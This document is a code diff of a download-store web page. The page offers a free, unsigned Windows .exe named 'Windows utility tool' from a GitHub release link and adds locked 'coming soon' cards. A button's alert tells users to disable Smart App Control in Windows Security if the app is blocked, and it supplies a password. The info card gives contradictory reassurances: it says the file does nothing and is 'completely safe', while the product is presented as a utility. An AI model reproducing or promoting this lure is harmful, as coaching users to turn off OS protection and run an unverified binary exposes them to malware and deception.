@@ -70,6 +70,7 @@
       position: relative;
     }
     .glass-card:hover { transform:translateY(-6px); border-color:rgba(212,160,23,0.5); box-shadow:0 28px 40px -15px rgba(0,0,0,0.6);}
+    /* Kiemelt kártya stílus */
     .glass-card.highlighted {
       transform: scale(1.02);
       border-color: var(--gold-primary);
@@ -77,32 +78,43 @@
       z-index: 1000;
       transition: all 0.3s ease;
     }
+    /* Locked card stílus (elhomályosítás + lakat ikon) */
+    .locked-card {
+      position: relative;
+      filter: blur(2px);
+      opacity: 0.75;
+      pointer-events: auto;
+      overflow: hidden;
+    }
+    .locked-card::before {
+      content: "\f023";
+      font-family: "Font Awesome 6 Free";
+      font-weight: 900;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 4rem;
+      color: var(--gold-primary);
+      text-shadow: 0 0 10px rgba(0,0,0,0.5);
+      z-index: 10;
+      pointer-events: none;
+      opacity: 0.9;
+    }
+    .locked-card .btn-download,
+    .locked-card .pass-btn,
+    .locked-card .icon-btn {
+      filter: blur(0);
+    }
+    .locked-card .highlight-btn {
+      filter: blur(0);
+    }
     .card-header { border-left:4px solid var(--gold-primary); padding-left:1rem; margin-bottom:1rem; }
     .card-header h2 { font-size:1.6rem; font-weight:700; background:linear-gradient(145deg,#ffffff,#e2ca86); background-clip:text; -webkit-background-clip:text; color:transparent;}
-    .product-details { margin:0.8rem 0 1rem 0; display:flex; flex-wrap:wrap; gap:0.8rem; align-items:center; }
+    .product-details { margin:0.8rem 0 1rem 0; display:flex; flex-wrap:wrap; gap:0.8rem; align-items:baseline; }
     .price-badge { background:rgba(0,255,100,0.15); padding:0.25rem 0.9rem; border-radius:40px; font-weight:700; color:#a0ffb0; font-size:1rem; border:1px solid #2eff7a30; }
     .file-type { background:rgba(183,124,255,0.2); padding:0.25rem 0.9rem; border-radius:40px; font-size:0.8rem; font-weight:500; }
     .os-badge { background:rgba(0,150,255,0.2); padding:0.25rem 0.9rem; border-radius:40px; font-size:0.8rem; font-weight:500; border:1px solid #2f9eff; color:#a0d0ff; display:inline-flex; align-items:center; gap:6px; }
-    /* Lakat gomb stílus */
-    .pass-btn {
-      background: rgba(0,0,0,0.5);
-      border: 1px solid rgba(232,183,59,0.5);
-      border-radius: 50%;
-      width: 32px;
-      height: 32px;
-      cursor: pointer;
-      color: var(--gold-primary);
-      font-size: 0.9rem;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      transition: 0.2s;
-    }
-    .pass-btn:hover {
-      background: var(--gold-primary);
-      color: #0a0a1a;
-      transform: scale(1.05);
-    }
     .btn-download { background:linear-gradient(95deg,#2a6ef0,#174ac9); border:none; width:100%; padding:1rem 0; margin:1rem 0 0.8rem 0; border-radius:60px; font-weight:800; font-size:1.2rem; letter-spacing:1px; color:white; cursor:pointer; transition:0.2s; box-shadow:0 8px 18px rgba(0,80,255,0.3); display:flex; align-items:center; justify-content:center; gap:12px; font-family:inherit;}
     .btn-download:hover { background:linear-gradient(95deg,#3f7eff,#2059e0); transform:scale(1.02); box-shadow:0 10px 24px rgba(0,100,255,0.5);}
     .icon-group { display:flex; gap:0.8rem; justify-content:flex-end; margin-top:0.5rem; }
@@ -113,11 +125,14 @@
     #tabsContent > div { display:none; }
     #tabsContent > div.active { display:block; }
     .toast-msg { position:fixed; bottom:25px; left:50%; transform:translateX(-50%); background:#1a1a2ee6; backdrop-filter:blur(12px); padding:12px 24px; border-radius:60px; font-size:0.9rem; font-weight:500; border-left:4px solid var(--gold-primary); z-index:200; color:white; pointer-events:none; white-space:nowrap; }
+    /* License Card */
     .license-card { margin-top: 3rem; background: rgba(10,10,20,0.6); backdrop-filter: blur(12px); border-radius: 2rem; padding: 1.8rem; border: 1px solid rgba(212,160,23,0.3); }
     .license-card h3 { font-size: 1.5rem; margin-bottom: 1rem; display: flex; align-items: center; gap: 10px; color: var(--gold-primary); }
     .license-text { font-size: 0.9rem; color: #ccc; line-height: 1.6; margin-bottom: 1.5rem; }
     .contact-btn { background: linear-gradient(95deg, #2a6ef0, #174ac9); border: none; padding: 0.7rem 1.8rem; border-radius: 60px; font-weight: 700; font-size: 1rem; color: white; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; gap: 8px; }
     .contact-btn:hover { transform: scale(1.02); background: linear-gradient(95deg, #3f7eff, #2059e0); box-shadow: 0 0 12px #2a6ef0; }
+    
+    /* Highlight button (info ikon a kártya jobb felső sarkában) */
     .highlight-btn {
       position: absolute;
       top: 12px;
@@ -143,6 +158,7 @@
       transform: scale(1.1);
       border-color: white;
     }
+    /* Overlay (homályosítás) */
     .overlay {
       position: fixed;
       top: 0;
@@ -155,6 +171,7 @@
       display: none;
       cursor: pointer;
     }
+    /* Információs kártya (megjelenik a kiemelt kártya mellett) */
     .info-card {
       position: fixed;
       background: linear-gradient(145deg, #1e1a3a, #0c0a1f);
@@ -169,10 +186,52 @@
       transition: 0.2s;
       display: none;
     }
-    .info-card h4 { font-size: 1.3rem; margin-bottom: 1rem; color: var(--gold-primary); display: flex; gap: 8px; align-items: center; }
-    .info-card p { font-size: 0.9rem; line-height: 1.5; color: #ddd; }
-    .info-card .close-info { margin-top: 1rem; background: none; border: 1px solid rgba(255,255,255,0.3); padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; transition: 0.2s; }
-    .info-card .close-info:hover { background: var(--gold-primary); color: black; }
+    .info-card h4 {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+      color: var(--gold-primary);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .info-card p {
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #ddd;
+    }
+    .info-card .close-info {
+      margin-top: 1rem;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.3);
+      padding: 0.4rem 1rem;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .info-card .close-info:hover {
+      background: var(--gold-primary);
+      color: black;
+    }
+    /* Pass gomb */
+    .pass-btn {
+      background: rgba(0,0,0,0.5);
+      border: 1px solid rgba(232,183,59,0.5);
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      cursor: pointer;
+      color: var(--gold-primary);
+      font-size: 0.9rem;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: 0.2s;
+    }
+    .pass-btn:hover {
+      background: var(--gold-primary);
+      color: #0a0a1a;
+      transform: scale(1.05);
+    }
     @media (max-width:700px){ .wrapper{padding:1rem 1rem 3rem;} .auth-fixed{top:0.8rem;right:1rem;padding:0.3rem 0.9rem;} .user-name{display:none;} .btn-download{font-size:1rem;} .icon-btn span{display:none;} .icon-btn i{margin:0;} .icon-btn{padding:0.5rem 0.8rem;} .license-text{font-size:0.8rem;} .info-card { width: 260px; padding: 1rem; } }
   </style>
 </head>
@@ -202,13 +261,14 @@
       <button class="contact-btn" id="contactEmailBtn"><i class="fas fa-envelope"></i> Contact Support</button>
     </div>
   </div>
+
   <div id="overlay" class="overlay"></div>
   <div id="infoCard" class="info-card">
-   <h4><i class="fas fa-flask"></i> Windows utility tool (.exe)</h4>
-   <p>Includes: cleanup, network fixes, system scans, disk check, and performance optimization.<br><br>
-   <p>⚠️ Windows may show a warning because the app is not digitally signed. This is normal and does not mean it is harmful.<br><br>
-   <p>⚠️ Disclaimer: Use at your own risk. We are not responsible for any damage or data loss caused by this tool.<br><br>
-   <i class="fas fa-shield-alt"></i> No data is collected. The program only runs when you use it.</p>    <button class="close-info" id="closeInfoBtn">Got it</button>
+    <h4><i class="fas fa-flask"></i>File Info</h4>
+    <p>This executable is a <strong>Win helper file</strong> created for development and demonstration purposes.<br><br>
+    It does <strong>not perform any actions</strong>, contains no malicious code, and is completely safe.<br><br>
+    <i class="fas fa-shield-alt"></i> No system changes, no data collection, no background processes.</p>
+    <button class="close-info" id="closeInfoBtn">Got it</button>
   </div>
 
   <script>
@@ -221,7 +281,9 @@
     const userAvatarSmall = document.getElementById('userAvatarSmall');
     const userNameSmall = document.getElementById('userNameSmall');
     const products = [
-      { id: "nexus_utility_tool", name: "Windows utility tool", githubUrl: "https://github.com/nexus-the-power/nexus-exe-store/releases/download/exe/NexusHelper-V1.exe", price: "Free", fileType: ".exe", os: "Win10/11", pass: "nexus" }
+      { id: "nexus_utility_tool", name: "Windows utility tool", githubUrl: "https://github.com/nexus-the-power/nexus-exe-store/releases/download/exe/NexusHelper-V1.exe", price: "Free", fileType: ".exe", os: "Win10/11", pass: "nexus", locked: false },
+      { id: "nexus_comming", name: "NEXUS", githubUrl: "#", price: "Free", fileType: ".exe", os: "Win10/11", pass: "nexus", locked: true },
+      { id: "nexus_comming", name: "NEXUS", githubUrl: "#", price: "Free", fileType: ".exe", os: "Win10/11", pass: "nexus", locked: true }
     ];
     
     const overlay = document.getElementById('overlay');
@@ -284,24 +346,42 @@
     function escapeAttr(str){ if(!str)return ''; return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
     
     function renderStore(){ 
-      const container=document.getElementById('storeList'); 
-      if(!container)return; 
-      container.innerHTML=''; 
-      products.forEach(prod=>{ 
-        const card=document.createElement('div'); 
-        card.className='glass-card'; 
-        card.innerHTML=`
+      const container = document.getElementById('storeList'); 
+      if(!container) return; 
+      container.innerHTML = ''; 
+      products.forEach(prod => { 
+        const card = document.createElement('div'); 
+        card.className = 'glass-card';
+        if (prod.locked) card.classList.add('locked-card');
+        
+        let passButtonHtml = '';
+        if (!prod.locked) {
+          passButtonHtml = `<button class="pass-btn" data-pass="${escapeAttr(prod.pass)}" title="Show password"><i class="fas fa-lock"></i></button>`;
+        } else {
+          passButtonHtml = `<button class="pass-btn" disabled style="opacity:0.5; cursor:not-allowed;" title="Coming soon"><i class="fas fa-hourglass-half"></i></button>`;
+        }
+        
+        let downloadButtonHtml = '';
+        if (!prod.locked) {
+          downloadButtonHtml = `<button class="btn-download" data-url="${escapeAttr(prod.githubUrl)}" data-name="${escapeAttr(prod.name)}">
+                                  <i class="fas fa-download"></i> DOWNLOAD
+                                </button>`;
+        } else {
+          downloadButtonHtml = `<button class="btn-download" disabled style="background:#555; cursor:not-allowed; box-shadow:none;">
+                                  <i class="fas fa-lock"></i> LOCKED
+                                </button>`;
+        }
+        
+        card.innerHTML = `
           <button class="highlight-btn" title="Show file info"><i class="fas fa-info-circle"></i></button>
           <div class="card-header"><h2>${escapeHtml(prod.name)}</h2></div>
           <div class="product-details">
             <span class="price-badge"><i class="fas fa-tag"></i> Price: Free</span>
             <span class="file-type"><i class="fas fa-file"></i> files: ${escapeHtml(prod.fileType)}</span>
             <span class="os-badge"><i class="fab fa-windows"></i> ${escapeHtml(prod.os)}</span>
-            <button class="pass-btn" data-pass="${escapeAttr(prod.pass)}" title="Show password"><i class="fas fa-lock"></i></button>
+            ${passButtonHtml}
           </div>
-          <button class="btn-download" data-url="${escapeAttr(prod.githubUrl)}" data-name="${escapeAttr(prod.name)}">
-            <i class="fas fa-download"></i> DOWNLOAD
-          </button>
+          ${downloadButtonHtml}
           <div class="icon-group">
             <button class="icon-btn copy-link-btn" data-url="${escapeAttr(prod.githubUrl)}" data-name="${escapeAttr(prod.name)}">
               <i class="fas fa-copy"></i> <span>Copy link</span>
@@ -316,22 +396,55 @@
         const highlightBtn = card.querySelector('.highlight-btn');
         highlightBtn.addEventListener('click', (e) => {
           e.stopPropagation();
+          if (prod.locked) {
+            alert(`🔒 ${prod.name} is not yet available. Coming soon!`);
+            return;
+          }
           showHighlight(card);
         });
-
-        const passBtn = card.querySelector('.pass-btn');
-        if(passBtn) {
-          passBtn.addEventListener('click', (e) => {
-            e.stopPropagation();
-            const password = passBtn.getAttribute('data-pass');
-            alert(`If Windows blocks the app, you may need to disable Smart App Control in Windows Security. Password: ${password}`);
-          });
+        
+        if (!prod.locked) {
+          const passBtn = card.querySelector('.pass-btn');
+          if(passBtn) {
+            passBtn.addEventListener('click', (e) => {
+              e.stopPropagation();
+              const password = passBtn.getAttribute('data-pass');
+              alert(`If Windows blocks the app, you may need to disable Smart App Control in Windows Security. Password: ${password}`);
+            });
+          }
         }
       });
       
-      document.querySelectorAll('.btn-download').forEach(btn=>{ btn.addEventListener('click',()=>{ const url=btn.getAttribute('data-url'); const name=btn.getAttribute('data-name'); if(url){ window.open(url,'_blank','noopener,noreferrer'); showToast(`⬇️ Downloading ${name} ...`); } else showToast(`⚠️ Link missing`,true); }); });
-      document.querySelectorAll('.copy-link-btn').forEach(btn=>{ btn.addEventListener('click',()=>{ const url=btn.getAttribute('data-url'); const name=btn.getAttribute('data-name'); if(url) copyToClipboard(url,name); else showToast(`No link`,true); }); });
-      document.querySelectorAll('.share-btn').forEach(btn=>{ btn.addEventListener('click',()=>{ const url=btn.getAttribute('data-url'); const name=btn.getAttribute('data-name'); if(url) shareLink(url,name); else showToast(`No shareable link`,true); }); });
+      document.querySelectorAll('.btn-download:not([disabled])').forEach(btn => { 
+        btn.addEventListener('click', () => { 
+          const url = btn.getAttribute('data-url'); 
+          const name = btn.getAttribute('data-name'); 
+          if(url && url !== '#'){ 
+            window.open(url, '_blank', 'noopener,noreferrer'); 
+            showToast(`⬇️ Downloading ${name} ...`); 
+          } else { 
+            showToast(`⚠️ This tool is locked (coming soon)`, true); 
+          } 
+        }); 
+      });
+      
+      document.querySelectorAll('.copy-link-btn').forEach(btn => { 
+        btn.addEventListener('click', () => { 
+          const url = btn.getAttribute('data-url'); 
+          const name = btn.getAttribute('data-name'); 
+          if(url && url !== '#') copyToClipboard(url, name); 
+          else showToast(`🔒 Locked item – no link yet`, true); 
+        }); 
+      });
+      
+      document.querySelectorAll('.share-btn').forEach(btn => { 
+        btn.addEventListener('click', () => { 
+          const url = btn.getAttribute('data-url'); 
+          const name = btn.getAttribute('data-name'); 
+          if(url && url !== '#') shareLink(url, name); 
+          else showToast(`🔒 Locked item – cannot share`, true); 
+        }); 
+      });
     }
     
     function updateAuthUI(user){ if(user){ authBtn.innerHTML='<i class="fas fa-sign-out-alt"></i> Logout'; authBtn.onclick=()=>auth.signOut(); userInfoArea.style.display='flex'; userAvatarSmall.src=user.photoURL||'https://placehold.co/40x40/3a2c6e/white?text=U'; userNameSmall.innerText=user.displayName||user.email?.split('@')[0]||'User'; } else { authBtn.innerHTML='<i class="fab fa-google"></i> Login'; authBtn.onclick=()=>auth.signInWithPopup(provider).catch(err=>showToast(`Login failed: ${err.message}`,true)); userInfoArea.style.display='none'; } }
